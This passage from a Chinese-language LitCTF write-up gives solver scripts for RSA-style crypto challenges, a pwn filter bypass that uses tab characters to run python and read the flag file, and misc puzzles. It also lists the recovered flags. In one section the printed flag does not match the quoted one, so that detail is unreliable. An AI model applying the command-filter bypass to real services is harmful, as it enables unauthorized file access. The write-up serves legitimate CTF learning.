class="string">c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>瞄了一眼，它只用了单个素数n作为模板，那就没什么意思了，直接计算φ(n)和d，最后解m转字符串即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line">phi = n - <span class="number">1</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}</p>
</blockquote>
<h3 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;LitCTF&#123;&#x27;</span>+ <span class="built_in">str</span>(uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">len_flag = flag.bit_length()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">P = GF(p)</span><br><span class="line">A = [[flag,                 getPrime(len_flag)],</span><br><span class="line">     [getPrime(len_flag),   getPrime(len_flag)]]</span><br><span class="line">A = matrix(P, A)</span><br><span class="line">B = A ** e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;B = <span class="subst">&#123;<span class="built_in">list</span>(B)&#125;</span>&quot;</span>.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># p = 8147594556101158967571180945694180896742294483544853070485096002084187305007965554901340220135102394516080775084644243545680089670612459698730714507241869</span></span><br><span class="line"><span class="comment"># B = [[2155477851953408309667286450183162647077775173298899672730310990871751073331268840697064969968224381692698267285466913831393859280698670494293432275120170, 4113196339199671283644050914377933292797783829068402678379946926727565560805246629977929420627263995348168282358929186302526949449679561299204123214741547], [3652128051559825585352835887172797117251184204957364197630337114276860638429451378581133662832585442502338145987792778148110514594776496633267082169998598, 2475627430652911131017666156879485088601207383028954405788583206976605890994185119936790889665919339591067412273564551745588770370229650653217822472440992]]</span></span><br></pre></td></tr></table></figure>
<p>直接丁真到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A = [[flag,                 getPrime(len_flag)],</span><br><span class="line">     [getPrime(len_flag),   getPrime(len_flag)]]</span><br></pre></td></tr></table></figure>
<p>是矩阵幂加密<br>那也没什么好说的了，祖传的板子直接梭哈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_mul</span>(<span class="params">A, B, mod</span>):</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        [(A[<span class="number">0</span>][<span class="number">0</span>]*B[<span class="number">0</span>][<span class="number">0</span>] + A[<span class="number">0</span>][<span class="number">1</span>]*B[<span class="number">1</span>][<span class="number">0</span>]) % mod,</span><br><span class="line">         (A[<span class="number">0</span>][<span class="number">0</span>]*B[<span class="number">0</span>][<span class="number">1</span>] + A[<span class="number">0</span>][<span class="number">1</span>]*B[<span class="number">1</span>][<span class="number">1</span>]) % mod],</span><br><span class="line">        [(A[<span class="number">1</span>][<span class="number">0</span>]*B[<span class="number">0</span>][<span class="number">0</span>] + A[<span class="number">1</span>][<span class="number">1</span>]*B[<span class="number">1</span>][<span class="number">0</span>]) % mod,</span><br><span class="line">         (A[<span class="number">1</span>][<span class="number">0</span>]*B[<span class="number">0</span>][<span class="number">1</span>] + A[<span class="number">1</span>][<span class="number">1</span>]*B[<span class="number">1</span>][<span class="number">1</span>]) % mod]</span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mat_pow</span>(<span class="params">matrix, exponent, mod</span>):</span><br><span class="line">    result = [[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line">    base = matrix</span><br><span class="line">    exp = exponent</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = mat_mul(result, base, mod)</span><br><span class="line">        base = mat_mul(base, base, mod)</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    p = <span class="number">8147594556101158967571180945694180896742294483544853070485096002084187305007965554901340220135102394516080775084644243545680089670612459698730714507241869</span></span><br><span class="line">    B = [</span><br><span class="line">        [<span class="number">2155477851953408309667286450183162647077775173298899672730310990871751073331268840697064969968224381692698267285466913831393859280698670494293432275120170</span>,</span><br><span class="line">         <span class="number">4113196339199671283644050914377933292797783829068402678379946926727565560805246629977929420627263995348168282358929186302526949449679561299204123214741547</span>],</span><br><span class="line">        [<span class="number">3652128051559825585352835887172797117251184204957364197630337114276860638429451378581133662832585442502338145987792778148110514594776496633267082169998598</span>,</span><br><span class="line">         <span class="number">2475627430652911131017666156879485088601207383028954405788583206976605890994185119936790889665919339591067412273564551745588770370229650653217822472440992</span>]</span><br><span class="line">    ]</span><br><span class="line">    order = (p*p - <span class="number">1</span>) * (p*p - p)</span><br><span class="line">    d = inverse(e, order)</span><br><span class="line">    A = mat_pow(B, d, p)</span><br><span class="line">    flag_int = A[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    flag = long_to_bytes(flag_int)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decrypt()</span><br></pre></td></tr></table></figure>
<p>直接解出flag</p>
<h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p,q = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">noise = getPrime(<span class="number">40</span>)</span><br><span class="line">tmp1 = noise*p+noise*q</span><br><span class="line">tmp2 = noise*noise</span><br><span class="line">hint = p*q+tmp1+tmp2</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span></span><br><span class="line"><span class="string">hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里存在噪声，会影响h<br>注意到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint = p*q+tmp1+tmp2</span><br></pre></td></tr></table></figure>
<p>那么就有了恢复p和q的方法<br>原式可转变为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint−n=(noisep+noiseq+noise**<span class="number">2</span>)=noise(p+q+noise).</span><br></pre></td></tr></table></figure>
<p>那么就有了入手的方向，noise很小，PR法求noise，解pq然后复原d，直接解就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span></span><br><span class="line">hint = <span class="number">17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span></span><br><span class="line">diff = hint - n</span><br><span class="line">X = <span class="number">942430120937</span></span><br><span class="line">s = (diff // X) - X</span><br><span class="line">D = gmpy2.isqrt(s * s - <span class="number">4</span> * n)</span><br><span class="line">p = (s + D) // <span class="number">2</span></span><br><span class="line">q = (s - D) // <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> p * q == n, <span class="string">&quot;p*q != n，解出错&quot;</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>
<p>挺不错的题</p>
<blockquote>
<p>LitCTF{13dd217e-9a67-4093-8a1b-d2592c45ba82}</p>
</blockquote>
<h3 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h3><p>这题好难好baby(背比)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">g = getPrime(<span class="number">512</span>)</span><br><span class="line">t = getPrime(<span class="number">150</span>)</span><br><span class="line">data = (t * gmpy2.invert(m, g)) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;data = <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span></span><br><span class="line"><span class="string">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>关键的就是</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = (t * invert(m, g)) % g</span><br></pre></td></tr></table></figure>
<p>查一下<br>思路上感觉和Wiener攻击很类似，就是利用“秘密”在数值上比已知量要小很多的特点，通过连分数快速定位到正确的分子&#x2F;分母<br>这里线性同余转连分数，然后做收敛分数，自己再修修改改,得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cont_frac</span>(<span class="params">numer, denom</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> denom:</span><br><span class="line">        a = numer // denom</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        numer, denom = denom, numer - a * denom</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents</span>(<span class="params">cf_terms</span>):</span><br><span class="line"></span><br><span class="line">    p0, q0 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    p1, q1 = cf_terms[<span class="number">0</span>], <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> p1, q1</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> cf_terms[<span class="number">1</span>:]:</span><br><span class="line">        p2 = a * p1 + p0</span><br><span class="line">        q2 = a * q1 + q0</span><br><span class="line">        <span class="keyword">yield</span> p2, q2</span><br><span class="line">        p0, p1 = p1, p2</span><br><span class="line">        q0, q1 = q1, q2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    g = <span class="number">7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span></span><br><span class="line">    data = <span class="number">2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span></span><br><span class="line">    cf = <span class="built_in">list</span>(cont_frac(data, g))</span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> convergents(cf):</span><br><span class="line">        t = data * q - p * g</span><br><span class="line">        <span class="keyword">if</span> t &gt; <span class="number">0</span> <span class="keyword">and</span> t.bit_length() == <span class="number">150</span> <span class="keyword">and</span> isPrime(t):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found potential t:&quot;</span>, t)</span><br><span class="line">            m = q</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Recovered m (integer):&quot;</span>, m)</span><br><span class="line">            </span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>顺利出结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Found potential t: 1195489027595714782252215502941452926270424077</span><br><span class="line">Recovered m (<span class="built_in">integer</span>): 637558173724466419510759412644075143734813144557473543913639658885806728973294110666447896405373</span><br><span class="line">Recovered flag: b<span class="string">&#x27;LitCTF&#123;56008a819331c9f3608a718327b7e6ce&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>LitCTF{db6f52b9265971910b306754b9df8b76}</p>
</blockquote>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>没过滤Tab键，在shell中Tab键可以当作分隔符</p>
<p>利用python读取文件并打印就行了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3&lt;TAB&gt;-c&lt;TAB&gt;<span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄"><a href="#灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄" class="headerlink" title="灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄"></a>灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄</h3><p>看源码，有探姬姐姐的项目，直接git clone到本地然后一把梭了(这个真好玩，嘻嘻嘻)<br><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/Lingicrypt">https://github.com/ProbiusOfficial/Lingicrypt</a><br>然后就直接终端运行解密即可</p>
<h3 id="Cropping"><a href="#Cropping" class="headerlink" title="Cropping"></a>Cropping</h3><p>一眼伪加密，修复即可<br>修复之后里面是很多的二维码碎片<br><img src="/image/misc1.png" alt="alt text"><br>掏出之前攒下来的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stitch_tiles</span>(<span class="params">input_dir, output_path</span>):</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;tile_(\d+)_(\d+)\.png$&quot;</span>)</span><br><span class="line">    tiles = []</span><br><span class="line">    <span class="keyword">for</span> fname <span class="keyword">in</span> os.listdir(input_dir):</span><br><span class="line">        m = pattern.<span class="keyword">match</span>(fname)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            row, col = <span class="built_in">map</span>(<span class="built_in">int</span>, m.groups())</span><br><span class="line">            tiles.append((row, col, os.path.join(input_dir, fname)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tiles:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No tile files found in &#123;&#125;&quot;</span>.<span class="built_in">format</span>(input_dir))</span><br><span class="line">    max_row = <span class="built_in">max</span>(r <span class="keyword">for</span> r, _, _ <span class="keyword">in</span> tiles)</span><br><span class="line">    max_col = <span class="built_in">max</span>(c <span class="keyword">for</span> _, c, _ <span class="keyword">in</span> tiles)</span><br><span class="line">    grid_rows = max_row + <span class="number">1</span></span><br><span class="line">    grid_cols = max_col + <span class="number">1</span></span><br><span class="line">    sample_img = Image.<span class="built_in">open</span>(tiles[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    tile_width, tile_height = sample_img.size</span><br><span class="line">    stitched = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (tile_width * grid_cols, tile_height * grid_rows), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> row, col, path <span class="keyword">in</span> tiles:</span><br><span class="line">        img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">        stitched.paste(img, (col * tile_width, row * tile_height))</span><br><span class="line">    stitched.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Stitched image saved to <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Stitch QR code tiles into one image&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Directory containing tile PNGs&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, default=<span class="string">&#x27;stitched_qr.png&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Output stitched image path&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    stitch_tiles(args.<span class="built_in">input</span>, args.output)</span><br></pre></td></tr></table></figure>
<p>然后终端运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python stitch_qr.py -input (这里我就不写我自己的路径了) -o out.png</span><br></pre></td></tr></table></figure>
<p>得到复原的二维码<img src="/image/out.png" alt="text"><br>直接扫码得到flag</p>
<blockquote>
<p>LitCTF{e7c3f4b2-9a6f-4d3f-9f98-0b3db91c2a12}</p>
</blockquote>
<h3 id="像素中的航班"><a href="#像素中的航班" class="headerlink" title="像素中的航班"></a>像素中的航班</h3><p>虽然长城杯没打进线下赛，但人在福州，怎么可能不知道长城杯决赛是在福州办的，这次litctf的主办方是郑州轻工业大学，那查航班自然是从郑州到福州的，中国南方航空的飞坤了<br>这里注意到<img src="/image/16c2c7e57d28c8735147f184eb2e7326.png" alt="alt text">，这里有一个飞坤的不知道是什么的编号，反正在这几趟航班里，通过这个B-5开头的关键线索就可以准确的定位到正确的航班(一发就过，哦耶)</p>
<blockquote>
<p>LitCTF{CZ8289}</p>
</blockquote>
<h3 id="消失的文字"><a href="#消失的文字" class="headerlink" title="消失的文字"></a>消失的文字</h3><p>这个稍微复杂一点点，先分析流量包<br><strong>usb流量包?</strong><br>那很棒了，王一航大佬开发的小工具，直接一把梭出鼠标流量<br><img src="/image/4097747ddcf913e288047c602c4fbad4.png" alt="alt text"><br>这个字符串稍微难读了点(哎，那个B我一直读成18，还好最后试出来了)<br>拿这个密钥解压缩包，嗷嗷，奇怪的一段话<br>试试零宽隐写，失败<br>我卡在这里很久，明明知道这个不是零宽隐写但还是在死磕<br>最后突然间想到，有可能文件名就是域名，那试试看<br><a target="_blank" rel="noopener" href="https://hidden-word.top/">https://hidden-word.top/</a>，真的有<br>直接丢上去解密<br><img src="/image/misc2.png" alt="alt text"></p>
<blockquote>
<p>LitCTF{39553317-df30-4951-8aad-fcaf3028ca9d}</p>
</blockquote>
